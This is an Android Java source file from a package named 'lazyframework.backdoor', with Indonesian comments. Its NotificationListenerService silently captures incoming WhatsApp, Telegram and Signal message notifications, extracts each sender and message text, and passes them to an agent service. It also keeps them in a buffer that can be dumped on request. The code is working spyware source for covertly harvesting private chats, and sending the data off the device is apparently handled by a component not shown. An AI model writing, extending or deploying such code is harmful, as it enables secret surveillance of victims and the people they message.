package com.lazyframework.backdoor;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "LazyFramework";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b";
    private static final String TELEGRAM_PACKAGE = "org.telegram.messenger";
    private static final String SIGNAL_PACKAGE = "org.thoughtcrime.securesms";
    
    // Cache untuk menghindari duplikasi
    private static final ConcurrentHashMap<String, Long> processedMessages = new ConcurrentHashMap<>();
    private static final long CACHE_TTL = 5000; // 5 detik
    
    private static AgentService agentService;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private StringBuilder messageBuffer = new StringBuilder();
    private static final int MAX_BUFFER_SIZE = 50000;
    
    // Interface untuk komunikasi dengan AgentService
    public interface MessageListener {
        void onMessageCaptured(String appName, String sender, String message, String timestamp);
    }
    
    private static MessageListener messageListener;
    
    public static void setAgentService(AgentService service) {
        agentService = service;
    }
    
    public static void setMessageListener(MessageListener listener) {
        messageListener = listener;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🔔 Notification Listener Service created");
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        
        // Cek apakah dari aplikasi chat yang didukung
        if (!isChatApp(packageName)) {
            return;
        }
        
        try {
            // Dapatkan notifikasi
            Bundle extras = sbn.getNotification().extras;
            
            // Cegah duplikasi
            String key = sbn.getKey();
            if (isDuplicate(key)) {
                return;
            }
            
            // Ekstrak informasi
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String bigText = extras.getString("android.bigText", "");
            
            // Gabungkan teks
            String fullText = text;
            if (bigText != null && !bigText.isEmpty() && !bigText.equals(text)) {
                fullText = bigText;
            }
            
            // Jika masih kosong, coba dari summary
            if (fullText == null || fullText.isEmpty()) {
                CharSequence summary = extras.getCharSequence("android.summaryText");
                if (summary != null) {
                    fullText = summary.toString();
                }
            }
            
            if (fullText == null || fullText.isEmpty()) {
                return;
            }
            
            // Parse pesan
            String appName = getAppName(packageName);
            String sender = extractSender(title, packageName);
            String message = cleanMessage(fullText, sender);
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date());
            
            // Log
            Log.d(TAG, "📥 Message captured:");
            Log.d(TAG, "   App: " + appName);
            Log.d(TAG, "   From: " + sender);
            Log.d(TAG, "   Message: " + message.substring(0, Math.min(100, message.length())) + "...");
            
            // Kirim ke AgentService
            if (agentService != null) {
                agentService.onWhatsAppMessageCaptured(appName, sender, message, timestamp);
            }
            
            // Kirim ke listener jika ada
            if (messageListener != null) {
                messageListener.onMessageCaptured(appName, sender, message, timestamp);
            }
            
            // Simpan ke buffer
            appendToBuffer(appName, sender, message, timestamp);
            
            // Hapus dari cache setelah TTL
            mainHandler.postDelayed(() -> {
                processedMessages.remove(key);
            }, CACHE_TTL);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error processing notification: " + e.getMessage());
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak digunakan, tapi harus diimplementasikan
    }
    
    // ==================== HELPER METHODS ====================
    
    private boolean isChatApp(String packageName) {
        return WHATSAPP_PACKAGE.equals(packageName) ||
               WHATSAPP_BUSINESS_PACKAGE.equals(packageName) ||
               TELEGRAM_PACKAGE.equals(packageName) ||
               SIGNAL_PACKAGE.equals(packageName);
    }
    
    private String getAppName(String packageName) {
        switch (packageName) {
            case WHATSAPP_PACKAGE:
            case WHATSAPP_BUSINESS_PACKAGE:
                return "WhatsApp";
            case TELEGRAM_PACKAGE:
                return "Telegram";
            case SIGNAL_PACKAGE:
                return "Signal";
            default:
                return packageName;
        }
    }
    
    private String extractSender(String title, String packageName) {
        // WhatsApp: title = "Contact Name" atau "Contact Name: message"
        if (WHATSAPP_PACKAGE.equals(packageName) || WHATSAPP_BUSINESS_PACKAGE.equals(packageName)) {
            // Cek apakah ada ":"
            if (title.contains(":")) {
                return title.substring(0, title.indexOf(":")).trim();
            }
            // Cek apakah ada " - " (format lain)
            if (title.contains(" - ")) {
                return title.substring(0, title.indexOf(" - ")).trim();
            }
            return title.trim();
        }
        
        // Telegram: title = "Contact Name" atau "Contact Name (app)"
        if (TELEGRAM_PACKAGE.equals(packageName)) {
            if (title.contains(" (")) {
                return title.substring(0, title.indexOf(" (")).trim();
            }
            return title.trim();
        }
        
        // Signal: similar to WhatsApp
        if (SIGNAL_PACKAGE.equals(packageName)) {
            if (title.contains(":")) {
                return title.substring(0, title.indexOf(":")).trim();
            }
            return title.trim();
        }
        
        return title.trim();
    }
    
    private String cleanMessage(String message, String sender) {
        // Hapus nama pengirim dari awal pesan jika ada
        if (sender != null && !sender.isEmpty() && message.startsWith(sender + ": ")) {
            return message.substring(sender.length() + 2);
        }
        if (sender != null && !sender.isEmpty() && message.startsWith(sender + ":")) {
            return message.substring(sender.length() + 1);
        }
        return message;
    }
    
    private boolean isDuplicate(String key) {
        Long lastTime = processedMessages.get(key);
        if (lastTime != null) {
            long now = System.currentTimeMillis();
            if (now - lastTime < CACHE_TTL) {
                return true;
            }
        }
        processedMessages.put(key, System.currentTimeMillis());
        return false;
    }
    
    private void appendToBuffer(String appName, String sender, String message, String timestamp) {
        synchronized (messageBuffer) {
            String entry = String.format("[%s] %s - %s: %s\n", 
                    timestamp, appName, sender, message);
            messageBuffer.append(entry);
            
            // Batasi ukuran buffer
            if (messageBuffer.length() > MAX_BUFFER_SIZE) {
                int cutIndex = messageBuffer.indexOf("\n", messageBuffer.length() - MAX_BUFFER_SIZE / 2);
                if (cutIndex > 0) {
                    messageBuffer.delete(0, cutIndex + 1);
                }
            }
        }
    }
    
    public String dumpMessages() {
        synchronized (messageBuffer) {
            String result = messageBuffer.toString();
            messageBuffer.setLength(0);
            return result;
        }
    }
    
    public void clearMessages() {
        synchronized (messageBuffer) {
            messageBuffer.setLength(0);
        }
    }
    
    public String getMessageStats() {
        synchronized (messageBuffer) {
            return String.format("Messages captured: %d lines, %d bytes", 
                    messageBuffer.toString().split("\n").length, 
                    messageBuffer.length());
        }
    }
              }
